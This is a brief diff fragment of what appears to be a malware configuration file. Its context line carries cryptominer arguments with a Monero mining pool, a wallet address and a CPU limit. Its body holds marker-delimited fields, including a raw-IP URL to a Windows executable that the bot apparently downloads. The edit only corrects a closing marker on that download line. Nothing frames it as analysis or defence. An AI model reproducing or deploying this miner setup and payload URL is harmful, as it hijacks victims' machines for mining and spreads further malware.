@@ -38,4 +38,4 @@ MLB-- --donate-level 1 --max-cpu-usage 30 -o pool.supportxmr.com:5555 -u 4DSQMNz
 MLON--ON--MLON
 --------------------------------------------------------------------------------------------------------------------------------------
 YCKZ--ON--YCKZ
-WJDZ--http://117.50.49.83/9992.exe--WJZD
+WJDZ--http://117.50.49.83/9992.exe--WJDZ
